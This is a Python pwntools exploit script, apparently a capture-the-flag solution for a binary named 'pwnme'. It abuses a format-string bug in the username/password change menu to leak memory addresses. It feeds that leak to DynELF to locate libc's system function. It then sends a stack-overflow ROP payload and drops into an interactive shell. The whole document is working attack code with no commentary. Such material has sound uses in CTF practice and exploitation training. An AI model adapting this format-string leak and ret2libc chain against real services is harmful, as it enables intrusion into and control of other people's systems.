from pwn import *

p =process("./pwnme")
#gdb.attach(p)

def respone(recv_buf,send_buf,new_line=True):
	p.recvuntil(recv_buf)
	if new_line:
		p.sendline(send_buf)
	else:
		p.send(send_buf)
#for DynELF
def leak(address):
	respone(">","2")
	respone("please input new username(max lenth:20): \n","%11$sAAAA")
	respone("please input new password(max lenth:20): \n","AAAA"+p64(address))
	respone(">","1")
	data = p.recvuntil("AAAA")[:-4]
	if data == "":
		data = "\x00"
	return data

respone("Input your username(max lenth:40): \n","tmpname")
respone("Input your password(max lenth:40): \n","tmppass")

d = DynELF(leak, elf=ELF("./pwnme"))
system_addr = d.lookup("system", "libc")
print(hex(system_addr))

#rop
payload = "A"*40 + p64(0x0000000000400ed3) + p64(0x000000000040048f) + p64(system_addr)
respone(">","2")
payload = payload.ljust(0x101,"A")
respone("please input new username(max lenth:20): \n","111")
respone("please input new password(max lenth:20): \n",payload)
p.interactive()



